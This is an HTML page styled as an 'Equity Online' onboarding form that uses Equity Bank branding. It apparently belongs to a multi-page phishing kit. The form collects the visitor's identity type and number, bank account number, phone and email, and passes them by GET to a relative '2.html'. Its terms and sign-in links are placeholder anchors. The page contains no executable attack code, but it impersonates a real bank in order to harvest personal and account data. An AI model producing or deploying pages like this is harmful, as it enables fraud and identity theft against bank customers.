<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Equity Online - Onboarding</title>
    <style>
        :root {
            --primary-color: #A32A29;
            --primary-hover: #8B2322;
            --bg-color: #F8F9FA;
            --card-bg: #FFFFFF;
            --text-main: #333333;
            --text-muted: #666666;
            --border-color: #E0E0E0;
            --focus-ring: rgba(163, 42, 41, 0.25);
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
        }

        body {
            background-color: var(--bg-color);
            color: var(--text-main);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            background: var(--card-bg);
            width: 100%;
            max-width: 480px;
            padding: 40px 32px;
            border-radius: 8px;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
            border: 1px solid var(--border-color);
        }

        .header {
            text-align: center;
            margin-bottom: 32px;
        }

        .brand-logo {
            font-size: 26px;
            font-weight: 800;
            color: var(--primary-color);
            letter-spacing: 1px;
            margin-bottom: 8px;
            text-transform: uppercase;
        }

        .title {
            font-size: 20px;
            font-weight: 600;
            color: var(--text-main);
            margin-bottom: 6px;
        }

        .subtitle {
            font-size: 14px;
            color: var(--text-muted);
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 8px;
            color: var(--text-main);
        }

        input[type="text"],
        input[type="email"],
        input[type="tel"],
        select {
            width: 100%;
            padding: 12px 14px;
            font-size: 15px;
            border: 1px solid var(--border-color);
            border-radius: 4px;
            background-color: #FFF;
            transition: border-color 0.2s, box-shadow 0.2s;
            outline: none;
        }

        input:focus,
        select:focus {
            border-color: var(--primary-color);
            box-shadow: 0 0 0 3px var(--focus-ring);
        }

        .checkbox-group {
            display: flex;
            align-items: flex-start;
            gap: 10px;
            margin-bottom: 24px;
        }

        .checkbox-group input[type="checkbox"] {
            margin-top: 3px;
            accent-color: var(--primary-color);
            width: 16px;
            height: 16px;
            cursor: pointer;
        }

        .checkbox-group label {
            font-size: 13px;
            color: var(--text-muted);
            font-weight: 400;
            line-height: 1.4;
            margin-bottom: 0;
            cursor: pointer;
        }

        .checkbox-group a {
            color: var(--primary-color);
            text-decoration: none;
        }

        .checkbox-group a:hover {
            text-decoration: underline;
        }

        .btn-submit {
            width: 100%;
            padding: 14px;
            background-color: var(--primary-color);
            color: #FFFFFF;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .btn-submit:hover {
            background-color: var(--primary-hover);
        }

        .footer-text {
            text-align: center;
            margin-top: 24px;
            font-size: 14px;
            color: var(--text-muted);
        }

        .footer-text a {
            color: var(--primary-color);
            text-decoration: none;
            font-weight: 500;
        }

        .footer-text a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="container">
        <div class="header">
            <div class="brand-logo">Equity</div>
            <h1 class="title">Get Started with Equity Online</h1>
            <p class="subtitle">Complete the onboarding form below to register your account.</p>
        </div>

        <form action="2.html" method="GET">
            <div class="form-group">
                <label for="idType">Identification Type</label>
                <select id="idType" name="idType" required>
                    <option value="" disabled selected>Select Identification Type</option>
                    <option value="national_id">National ID</option>
                    <option value="passport">Passport</option>
                    <option value="alien_id">Alien ID</option>
                </select>
            </div>

            <div class="form-group">
                <label for="idNumber">ID / Passport Number</label>
                <input type="text" id="idNumber" name="idNumber" placeholder="Enter your ID number" required>
            </div>

            <div class="form-group">
                <label for="accountNumber">Equity Bank Account Number</label>
                <input type="text" id="accountNumber" name="accountNumber" placeholder="Enter your account number" required>
            </div>

            <div class="form-group">
                <label for="phone">Mobile Phone Number</label>
                <input type="tel" id="phone" name="phone" placeholder="e.g. +254 700 000000" required>
            </div>

            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" name="email" placeholder="name@example.com" required>
            </div>

            <div class="checkbox-group">
                <input type="checkbox" id="terms" name="terms" required>
                <label for="terms">I accept the <a href="#">Terms & Conditions</a> and consent to the processing of my data in accordance with the Privacy Policy.</label>
            </div>

            <button type="submit" class="btn-submit">Continue</button>
        </form>

        <div class="footer-text">
            Already registered? <a href="#">Sign in here</a>
        </div>
    </div>

</body>
</html>
